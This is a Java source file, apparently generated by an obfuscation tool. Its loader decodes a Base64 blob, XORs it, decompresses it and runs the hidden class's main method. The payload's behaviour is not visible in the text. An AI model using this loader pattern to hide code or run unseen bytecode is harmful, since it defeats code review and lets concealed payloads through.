import java.io.ByteArrayOutputStream;
import java.lang.reflect.InvocationTargetException;
import java.util.Base64;
import java.util.zip.DataFormatException;
import java.util.zip.Inflater;

/**
 * Created by azarn on 5/18/16.
 */
public class JavaObfuscateStub extends ClassLoader {
    private static byte XOR_CONSTANT = 0;
    private static String OBFUSCATED_DATA = "eNp1Um1P01AYPXcdu2vtcOtekBelU1664pwSP5BITHAIX4YYN02WfSAX1iyF0i30YsK/8S9g" +
                                            "YEsk4Qf4k/xgfC5bYgy1H56ec59zTp/cpz9//7gF8BrraTxLY4ljhWOVw+VY43jOUdWhoagj" +
                                            "jRmDUF6VgoEpPDKQgmWAqzOOkiqzJhYxr8pjE45CDp6aqGDBRA1lEy9V4xXmGApOpXEsvopa" +
                                            "IMJerSnP/LD3hkFzKl8Yqs793n35u3M/6Hpn5CrG6Smn5HTiG6lNP/TlW4Zkvd/1KGAs8/u1" +
                                            "j6SRpPTEKQVbcTNaexf2mNjSi6TtRzbD9If9g+33O1ufG62DrU+7DJmmFEcne2LQEocBfUJv" +
                                            "kbYeiChiyHficpmgwcRg4IVdksQMxJD9a9s/PPaOJMPMf67lH3HzIpIe+ZOnwg/plvvn5OQD" +
                                            "FR0QT8v+2IsyrTdFPwRDQu2OkEaI9kknNrESsQS9DXeEaXftGvol1KPU8xPNCpKEgLnvMG7A" +
                                            "2xYb4aF7BX2I7BC5ITJjj44XeDLxbEw8Zfc2+Q25G2htV1sf4cEI5qViVmJC7oZbpjoF9gsF" +
                                            "4A9YXpuw";

    public Class findClass(String name) {
        byte[] data = Base64.getDecoder().decode(OBFUSCATED_DATA);
        for (int i = 0; i < data.length; ++i) {
            data[i] ^= XOR_CONSTANT;
        }

        Inflater inflater = new Inflater();
        inflater.setInput(data);

        ByteArrayOutputStream res = new ByteArrayOutputStream();
        try {
            byte[] buf = new byte[1024];
            while (!inflater.finished()) {
                int count = inflater.inflate(buf);
                res.write(buf, 0, count);
            }
        } catch (DataFormatException e) {
            return null;
        }

        inflater.end();
        data = res.toByteArray();
        return defineClass(name, data, 0, data.length);
    }

    public static void main(String args[]) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        new JavaObfuscateStub().findClass(null).getMethod("main", String[].class).invoke(null, (Object)args);
    }
}
